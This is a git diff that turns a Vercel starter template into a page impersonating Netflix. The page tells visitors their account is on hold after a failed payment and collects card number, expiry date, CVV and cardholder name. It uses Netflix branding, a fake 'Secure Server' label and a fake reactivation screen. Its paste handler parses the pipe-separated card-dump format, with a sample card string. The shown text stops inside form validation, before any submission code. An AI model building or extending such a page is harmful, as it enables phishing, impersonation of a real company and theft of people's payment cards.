@@ -1,96 +1,956 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Update Payment Method - Netflix</title>
+  <style>
+    /* Reset and base styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f3f3f3;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    /* Header styles */
+    header {
+      background-color: #fff;
+      border-bottom: 1px solid #e6e6e6;
+      padding: 20px 0;
+    }
+
+    .netflix-logo {
+      width: 110px;
+      height: 30px;
+      fill: #e50914;
+    }
+
+    /* Main content styles */
+    main {
+      padding: 30px 0 60px;
+      max-width: 1000px;
+      margin: 0 auto;
+      background-color: #fff;
+      border-radius: 4px;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+      margin-top: 20px;
+    }
+
+    .page-content {
+      padding: 0 30px;
+    }
+
+    h1 {
+      font-size: 32px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      color: #000;
+    }
+
+    .subtitle {
+      color: #737373;
+      margin-bottom: 16px;
+      font-size: 16px;
+    }
+
+    .secure-server {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+      color: #737373;
+      margin-bottom: 24px;
+    }
+
+    .secure-server svg {
+      margin-right: 8px;
+      color: #737373;
+    }
+
+    /* Alert styles */
+    .alert {
+      background-color: #fef4f4;
+      border: 1px solid #e87c86;
+      border-radius: 4px;
+      padding: 16px;
+      margin-bottom: 32px;
+      display: flex;
+      align-items: flex-start;
+    }
+
+    .alert svg {
+      margin-right: 12px;
+      flex-shrink: 0;
+      margin-top: 2px;
+      color: #e50914;
+    }
+
+    .alert-title {
+      font-weight: 600;
+      color: #e50914;
+      margin-bottom: 4px;
+    }
+
+    .alert-description {
+      color: #737373;
+      font-size: 14px;
+    }
+
+    /* Grid layout */
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 32px;
+    }
+
+    @media (min-width: 768px) {
+      .grid {
+        grid-template-columns: 2fr 1fr;
+      }
+    }
+
+    /* Card styles */
+    .card {
+      border: 1px solid #e6e6e6;
+      border-radius: 4px;
+      padding: 24px;
+      margin-bottom: 24px;
+      background-color: #fff;
+    }
+
+    .card-title {
+      font-size: 19px;
+      font-weight: 600;
+      margin-bottom: 16px;
+      color: #000;
+    }
+
+    /* Form styles */
+    .form-group {
+      margin-bottom: 24px;
+    }
+
+    .form-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 24px;
+    }
+
+    .form-row {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    label {
+      display: block;
+      font-weight: 500;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .label-with-icon {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .input-wrapper {
+      position: relative;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 16px;
+      border: 1px solid #b3b3b3;
+      border-radius: 2px;
+      font-size: 16px;
+      color: #000;
+    }
+
+    input:focus {
+      outline: none;
+      border-color: #0071eb;
+      box-shadow: 0 0 0 1px #0071eb;
+    }
+
+    input::placeholder {
+      color: #8c8c8c;
+    }
+
+    .input-icon {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #8c8c8c;
+    }
+
+    /* Button styles */
+    .btn {
+      background-color: #e50914;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 16px 24px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: background-color 0.2s;
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .btn:hover {
+      background-color: #f6121d;
+    }
+
+    .btn svg {
+      margin-left: 8px;
+    }
+
+    .btn:disabled {
+      background-color: #f6121d;
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+
+    /* Summary card styles */
+    .summary-card {
+      background-color: #f8f8f8;
+      border-radius: 4px;
+      padding: 24px;
+      border: 1px solid #e6e6e6;
+    }
+
+    .summary-title {
+      font-weight: 600;
+      margin-bottom: 16px;
+      font-size: 19px;
+      color: #000;
+    }
+
+    .summary-item {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 12px;
+      font-size: 14px;
+    }
+
+    .summary-value {
+      font-weight: 500;
+    }
+
+    .status-on-hold {
+      color: #e50914;
+    }
+
+    .summary-footer {
+      margin-top: 24px;
+      padding-top: 16px;
+      border-top: 1px solid #e6e6e6;
+      font-size: 13px;
+      color: #737373;
+    }
+
+    /* Confirmation screen */
+    .confirmation {
+      text-align: center;
+      padding: 64px 0;
+      display: none;
+    }
+
+    .confirmation.active {
+      display: block;
+    }
+
+    .check-circle {
+      width: 64px;
+      height: 64px;
+      background-color: #2aca75;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 24px;
+    }
+
+    .check-circle svg {
+      width: 32px;
+      height: 32px;
+      color: white;
+    }
+
+    .confirmation-title {
+      font-size: 24px;
+      font-weight: 700;
+      margin-bottom: 16px;
+      color: #000;
+    }
+
+    .confirmation-message {
+      color: #737373;
+      max-width: 500px;
+      margin: 0 auto 32px;
+      font-size: 16px;
+    }
+
+    .loading-indicator {
+      width: 96px;
+      height: 4px;
+      background-color: #e50914;
+      border-radius: 2px;
+      margin: 0 auto;
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0% {
+        opacity: 1;
+      }
+      50% {
+        opacity: 0.5;
+      }
+      100% {
+        opacity: 1;
+      }
+    }
+
+    /* Hide payment form when confirmation is shown */
+    .payment-form.hidden {
+      display: none;
+    }
+
+    /* Credit card icons */
+    .card-icons {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .card-icon {
+      width: 40px;
+      height: 25px;
+      border-radius: 4px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 4px;
+    }
+
+    .card-icon img {
+      max-width: 100%;
+      max-height: 100%;
+    }
+
+    /* Footer */
+    footer {
+      padding: 20px 0;
+      background-color: #f3f3f3;
+      color: #737373;
+      font-size: 13px;
+      margin-top: 40px;
+    }
+
+    .footer-content {
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 16px;
+      margin-top: 16px;
+    }
+
+    .footer-links a {
+      color: #737373;
+      text-decoration: none;
+    }
+
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    /* Error styles */
+    .error-message {
+      color: #e50914;
+      font-size: 13px;
+      margin-top: 4px;
+      display: none;
+    }
+
+    input.error {
+      border-color: #e50914;
+    }
+
+    /* Responsive adjustments */
+    @media (max-width: 768px) {
+      .form-row {
+        grid-template-columns: 1fr;
+      }
+      
+      main {
+        margin-top: 0;
+        border-radius: 0;
+        box-shadow: none;
+      }
+      
+      .page-content {
+        padding: 0 20px;
+      }
+      
+      h1 {
+        font-size: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <svg viewBox="0 0 111 30" class="netflix-logo" aria-hidden="true" focusable="false">
+        <g>
+          <path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z"></path>
+        </g>
+      </svg>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="page-content">
+      <!-- Confirmation Screen (initially hidden) -->
+      <div class="confirmation" id="confirmationScreen">
+        <div class="check-circle">
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7" />
+          </svg>
+        </div>
+        <h1 class="confirmation-title">Payment Method Updated!</h1>
+        <p class="confirmation-message">
+          Your account has been successfully reactivated. You will be redirected to Netflix in a few seconds...
+        </p>
+        <div class="loading-indicator"></div>
+      </div>
+
+      <!-- Payment Form -->
+      <div class="payment-form" id="paymentForm">
+        <div class="page-header">
+          <h1>Update your payment method</h1>
+          <p class="subtitle">
+            Your account is currently on hold because of a problem with your last payment.
+          </p>
+          <div class="secure-server">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <span>Secure Server</span>
+          </div>
+        </div>
+
+        <div class="alert">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"></circle>
+            <line x1="12" y1="8" x2="12" y2="12"></line>
+            <line x1="12" y1="16" x2="12.01" y2="16"></line>
+          </svg>
+          <div>
+            <div class="alert-title">Payment Failed</div>
+            <div class="alert-description">
+              We couldn't process your payment on <span id="failedDate">today</span>. Please update your payment method to continue your membership and restore access to your account.
+            </div>
+          </div>
+        </div>
+
+        <div class="grid">
+          <div>
+            <form id="paymentUpdateForm">
+              <div class="card">
+                <h2 class="card-title">Credit or Debit Card</h2>
+                
+                <div class="card-icons">
+                  <!-- Visa -->
+                  <div class="card-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="25" viewBox="0 0 40 25">
+                      <rect width="40" height="25" rx="4" fill="#F7F7F7"/>
+                      <path d="M15.4 16.3H12.7L14.4 8.7H17.1L15.4 16.3Z" fill="#00579F"/>
+                      <path d="M24.1 8.9C23.5 8.7 22.6 8.5 21.5 8.5C19 8.5 17.2 9.8 17.2 11.7C17.2 13.1 18.5 13.9 19.5 14.4C20.5 14.9 20.8 15.2 20.8 15.6C20.8 16.2 20.1 16.5 19.5 16.5C18.6 16.5 18.1 16.4 17.2 16L16.9 15.9L16.6 18.2C17.3 18.5 18.5 18.7 19.7 18.7C22.4 18.7 24.1 17.4 24.1 15.4C24.1 14.3 23.4 13.4 22 12.8C21.2 12.4 20.7 12.1 20.7 11.7C20.7 11.3 21.1 10.9 22 10.9C22.7 10.9 23.3 11 23.7 11.2L24 11.3L24.3 9.1L24.1 8.9Z" fill="#00579F"/>
+                      <path d="M27.7 8.7H25.9C25.4 8.7 25 8.9 24.8 9.4L22 16.3H24.7L25.1 15.2H27.6L27.8 16.3H30.2L28.5 8.7H27.7ZM25.7 13.4C25.9 12.9 26.5 11.5 26.5 11.5C26.5 11.5 26.7 11.1 26.8 10.8L26.9 11.4C26.9 11.4 27.3 12.9 27.4 13.4H25.7Z" fill="#00579F"/>
+                      <path d="M10.7 8.7L8.2 14.2L8 13.3C7.5 11.9 6.2 10.4 4.7 9.6L7 16.3H9.7L13.5 8.7H10.7Z" fill="#00579F"/>
+                      <path d="M6.2 8.7H2L2 8.9C5.4 9.7 7.7 11.8 8.5 14.2L7.7 9.4C7.6 8.9 7.2 8.7 6.7 8.7H6.2Z" fill="#FAA61A"/>
+                    </svg>
+                  </div>
+                  <!-- Mastercard -->
+                  <div class="card-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="25" viewBox="0 0 40 25">
+                      <rect width="40" height="25" rx="4" fill="#F7F7F7"/>
+                      <path d="M25 17.5C27.4 17.5 29.5 15.7 29.5 13.5C29.5 11.3 27.4 9.5 25 9.5C22.6 9.5 20.5 11.3 20.5 13.5C20.5 15.7 22.6 17.5 25 17.5Z" fill="#EB001B"/>
+                      <path d="M15 17.5C17.4 17.5 19.5 15.7 19.5 13.5C19.5 11.3 17.4 9.5 15 9.5C12.6 9.5 10.5 11.3 10.5 13.5C10.5 15.7 12.6 17.5 15 17.5Z" fill="#F79E1B"/>
+                      <path d="M20 15.5C21.1 14.8 21.8 13.7 21.8 12.5C21.8 11.3 21.1 10.2 20 9.5C18.9 10.2 18.2 11.3 18.2 12.5C18.2 13.7 18.9 14.8 20 15.5Z" fill="#FF5F00"/>
+                    </svg>
+                  </div>
+                  <!-- American Express -->
+                  <div class="card-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="25" viewBox="0 0 40 25">
+                      <rect width="40" height="25" rx="4" fill="#F7F7F7"/>
+                      <path d="M35.5 17H33.2L31.9 15.3L30.6 17H24.1V9H30.4L31.7 10.7L33 9H35.3L32.7 13L35.5 17Z" fill="#006FCF"/>
+                      <path d="M33.8 16.1L31.9 13.6L30 16.1H33.8Z" fill="white"/>
+                      <path d="M32.7 13L35.3 9H33L31.7 10.7L30.4 9H24.1V16.9H30.6L31.9 15.2L33.2 16.9H35.5L32.7 13ZM25.1 15.9V10H29.8L31.9 12.9L34 10H34.1L32.1 13L34.2 15.9H33.9L31.9 13.1L29.9 15.9H25.1Z" fill="#006FCF"/>
+                      <path d="M27.5 14.9H25.1V13.9H27.3V12.9H25.1V12H27.6L28.8 13.5L27.5 14.9Z" fill="#006FCF"/>
+                      <path d="M4.5 17H9.1L10 15.7H11.9L12.8 17H18.1V15.9L18.8 17H21.5L22.2 15.9V17H29.1L30.4 15.7L31.6 17H35.5V9H31.5L30.3 10.3L29.2 9H21.1V10.1L20.5 9H16.5L14.8 12.9L13.1 9H9.1V10.1L8.5 9H5L4.5 17Z" fill="#006FCF"/>
+                      <path d="M6.5 16V10H9.5L11.9 15.2L14.3 10H17.3V16H15.8V11.1L13.1 16H10.7L8 11.1V16H6.5Z" fill="white"/>
+                      <path d="M18.5 16H20.1V10H18.5V16Z" fill="white"/>
+                      <path d="M22.5 16H24V13H27V11.5H24V10.5H27.5V9H22.5V16Z" fill="white"/>
+                    </svg>
+                  </div>
+                  <!-- JCB -->
+                  <div class="card-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="25" viewBox="0 0 40 25">
+                      <rect width="40" height="25" rx="4" fill="#F7F7F7"/>
+                      <path d="M12 18H8C6.9 18 6 17.1 6 16V10C6 8.9 6.9 8 8 8H12C13.1 8 14 8.9 14 10V16C14 17.1 13.1 18 12 18Z" fill="#047AB1"/>
+                      <path d="M12 13.5C12 12.1 10.9 11 9.5 11H8V16H9.5C10.9 16 12 14.9 12 13.5Z" fill="white"/>
+                      <path d="M22 18H18C16.9 18 16 17.1 16 16V10C16 8.9 16.9 8 18 8H22C23.1 8 24 8.9 24 10V16C24 17.1 23.1 18 22 18Z" fill="#D92120"/>
+                      <path d="M22 13.5C22 12.1 20.9 11 19.5 11H18V16H19.5C20.9 16 22 14.9 22 13.5Z" fill="white"/>
+                      <path d="M32 18H28C26.9 18 26 17.1 26 16V10C26 8.9 26.9 8 28 8H32C33.1 8 34 8.9 34 10V16C34 17.1 33.1 18 32 18Z" fill="#5D7C19"/>
+                      <path d="M32 13.5C32 12.1 30.9 11 29.5 11H28V16H29.5C30.9 16 32 14.9 32 13.5Z" fill="white"/>
+                    </svg>
+                  </div>
+                </div>
+                
+                <div class="form-grid">
+                  <div class="form-group">
+                    <label for="cardNumber">Card Number</label>
+                    <div class="input-wrapper">
+                      <input 
+                        type="text" 
+                        id="cardNumber" 
+                        placeholder="1234 5678 9012 3456" 
+                        required
+                        maxlength="19"
+                      >
+                      <svg class="input-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect>
+                        <line x1="1" y1="10" x2="23" y2="10"></line>
+                      </svg>
+                    </div>
+                    <div class="error-message" id="cardNumberError">Please enter a valid card number</div>
+                  </div>
+                  
+                  <div class="form-row">
+                    <div class="form-group">
+                      <label for="expiryDate">Expiration Date (MM/YY)</label>
+                      <input 
+                        type="text" 
+                        id="expiryDate" 
+                        placeholder="MM/YY" 
+                        required
+                        maxlength="5"
+                      >
+                      <div class="error-message" id="expiryDateError">Please enter a valid expiration date</div>
+                    </div>
+                    <div class="form-group">
+                      <div class="label-with-icon">
+                        <label for="cvv">Security Code (CVV)</label>
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                          <circle cx="12" cy="12" r="10"></circle>
+                          <line x1="12" y1="16" x2="12" y2="12"></line>
+                          <line x1="12" y1="8" x2="12.01" y2="8"></line>
+                        </svg>
+                      </div>
+                      <input 
+                        type="text" 
+                        id="cvv" 
+                        placeholder="123" 
+                        required
+                        maxlength="4"
+                      >
+                      <div class="error-message" id="cvvError">Please enter a valid CVV</div>
+                    </div>
+                  </div>
+                  
+                  <div class="form-group">
+                    <label for="nameOnCard">Name on Card</label>
+                    <input 
+                      type="text" 
+                      id="nameOnCard" 
+                      placeholder="John Smith" 
+                      required
+                    >
+                    <div class="error-message" id="nameOnCardError">Please enter the name on your card</div>
+                  </div>
+                </div>
+              </div>
+
+              <button type="submit" class="btn" id="updateButton">
+                Update Payment Method
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <polyline points="9 18 15 12 9 6"></polyline>
+                </svg>
+              </button>
+            </form>
+          </div>
+
+          <div>
+            <div class="summary-card">
+              <h3 class="summary-title">Account Summary</h3>
+              
+              <div class="summary-item">
+                <span>Status</span>
+                <span class="summary-value status-on-hold">On Hold</span>
+              </div>
+              
+              <div class="summary-item">
+                <span>Plan</span>
+                <span class="summary-value">Standard</span>
+              </div>
+              
+              <div class="summary-item">
+                <span>Monthly price</span>
+                <span class="summary-value">$15.49</span>
+              </div>
+              
+              <div class="summary-item">
+                <span>Failed billing date</span>
+                <span class="summary-value" id="billingDate">Today</span>
+              </div>
+              
+              <div class="summary-footer">
+                <p>
+                  Your streaming access will be restored immediately after your payment method is updated.
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <div>Questions? Call 1-800-NETFLIX</div>
+      <div class="footer-links">
+        <a href="#">FAQ</a>
+        <a href="#">Help Center</a>
+        <a href="#">Terms of Use</a>
+        <a href="#">Privacy</a>
+        <a href="#">Cookie Preferences</a>
+        <a href="#">Corporate Information</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Set the current date for the failed billing date
+    function setCurrentDate() {
+      const now = new Date();
+      const options = { year: 'numeric', month: 'long', day: 'numeric' };
+      const formattedDate = now.toLocaleDateString('en-US', options);
+      
+      document.getElementById('failedDate').textContent = formattedDate;
+      document.getElementById('billingDate').textContent = formattedDate;
+    }
+    
+    // Call the function when the page loads
+    window.onload = setCurrentDate;
+
+    // Format card number with spaces
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+      
+      // Extract only the first 16 digits
+      value = value.substring(0, 16);
+      
+      let formattedValue = '';
+      
+      for (let i = 0; i < value.length; i++) {
+        if (i > 0 && i % 4 === 0) {
+          formattedValue += ' ';
+        }
+        formattedValue += value[i];
+      }
+      
+      e.target.value = formattedValue;
+    });
+
+    // Also handle paste event to extract card number from formats like "4117764040941380|11|28|177"
+    document.getElementById('cardNumber').addEventListener('paste', function(e) {
+      // Prevent default paste behavior
+      e.preventDefault();
+      
+      // Get pasted text from clipboard
+      let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+      
+      // If the pasted text contains pipe characters, it might be in the format "number|month|year|cvv"
+      if (pastedText.includes('|')) {
+        const parts = pastedText.split('|');
+        // Extract card number (first part)
+        const cardNumber = parts[0].replace(/\D/g, '').substring(0, 16);
+        
+        // Format and set card number
+        let formattedValue = '';
+        for (let i = 0; i < cardNumber.length; i++) {
+          if (i > 0 && i % 4 === 0) {
+            formattedValue += ' ';
+          }
+          formattedValue += cardNumber[i];
+        }
+        this.value = formattedValue;
+        
+        // If we have month and year (parts[1] and parts[2]), set the expiry date
+        if (parts.length > 2 && parts[1] && parts[2]) {
+          const month = parts[1].padStart(2, '0').substring(0, 2);
+          const year = parts[2].substring(0, 2);
+          document.getElementById('expiryDate').value = `${month}/${year}`;
+        }
+        
+        // If we have CVV (parts[3]), set it
+        if (parts.length > 3 && parts[3]) {
+          document.getElementById('cvv').value = parts[3].replace(/\D/g, '').substring(0, 4);
+        }
+      } else {
+        // Just handle card number as before for non-piped formats
+        let cardDigits = pastedText.replace(/\D/g, '').substring(0, 16);
+        
+        // Format with spaces
+        let formattedValue = '';
+        for (let i = 0; i < cardDigits.length; i++) {
+          if (i > 0 && i % 4 === 0) {
+            formattedValue += ' ';
+          }
+          formattedValue += cardDigits[i];
+        }
+        
+        // Set the value
+        this.value = formattedValue;
+      }
+    });
+
+    // Format expiry date with slash
+    document.getElementById('expiryDate').addEventListener('input', function(e) {
+      let value = e.target.value.replace(/\D/g, '');
+      
+      if (value.length > 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+      
+      e.target.value = value;
+    });
+
+    // Add paste event for expiry date
+    document.getElementById('expiryDate').addEventListener('paste', function(e) {
+      e.preventDefault();
+      let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+      
+      // If it includes a slash already, just clean it
+      if (pastedText.includes('/')) {
+        const parts = pastedText.split('/');
+        const month = parts[0].replace(/\D/g, '').substring(0, 2).padStart(2, '0');
+        const year = parts[1] ? parts[1].replace(/\D/g, '').substring(0, 2) : '';
+        this.value = `${month}/${year}`;
+      } else {
+        // Otherwise extract digits and format
+        const digits = pastedText.replace(/\D/g, '');
+        if (digits.length >= 2) {
+          const month = digits.substring(0, 2);
+          const year = digits.length > 2 ? digits.substring(2, 4) : '';
+          this.value = `${month}/${year}`;
+        } else {
+          this.value = digits;
+        }
+      }
+    });
+
+    // Only allow numbers in CVV
+    document.getElementById('cvv').addEventListener('input', function(e) {
+      e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+    });
+
+    // Add paste event for CVV
+    document.getElementById('cvv').addEventListener('paste', function(e) {
+      e.preventDefault();
+      let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+      this.value = pastedText.replace(/\D/g, '').substring(0, 4);
+    });
+
+    // Form validation
+    function validateForm() {
+      let isValid = true;
+      
+      // Card number validation
+      const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+      if (cardNumber.length < 13 || cardNumber.length > 19 || !/^\d+$/.test(cardNumber)) {
+        document.getElementById('cardNumber').classList.add('error');
+        document.getElementById('cardNumberError').style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById('cardNumber').classList.remove('error');
+        document.getElementById('cardNumberError').style.display = 'none';
+      }
+      
+      // Expiry date validation
+      const expiryDate = document.getElementById('expiryDate').value;
+      const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+      if (!expiryPattern.test(expiryDate)) {
+        document.getElementById('expiryDate').classList.add('error');
+        document.getElementById('expiryDateError').style.display = 'block';
+        isValid = false;
+      } else {
+        const month = parseInt(expiryDate.split('/')[0]);
+        const year = parseInt('20' + expiryDate.split('/')[1]);
+        const now = new Date();
+        const currentYear = now.getFullYear();
+        const currentMonth = now.getMonth() + 1;
+        
+        if (year < currentYear || (year === currentYear && month < currentMonth)) {
+          document.getElementById('expiryDate').classList.add('error');
+          document.getElementById('expiryDateError').style.display = 'block';
+          isValid = false;
+        } else {
+          document.getElementById('expiryDate').classList.remove('error');
+          document.getElementById('expiryDateError').style.display = 'none';
+        }
+      }
+      
+      // CVV validation
+      const cvv = document.getElementById('cvv').value;
+      if (cvv.length < 3 || !/^\d+$/.test(cvv)) {
+        document.getElementById('cvv').classList.add('error');
+        document.getElementById('cvvError').style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById('cvv').classList.remove('error');
+        document.getElementById('cvvError').style.display = 'none';
+      }
+      
+      // Name validation
+      const nameOnCard = document.getElementById('nameOnCard').value.trim();
+      if (nameOnCard.length < 3) {
+        document.getElementById('nameOnCard').classList.add('error');
+        document.getElementById('nameOnCardError').style.display = 'block';
+        isValid = false;
+      } else {
+        document.getElementById('nameOnCard').classList.remove('error');
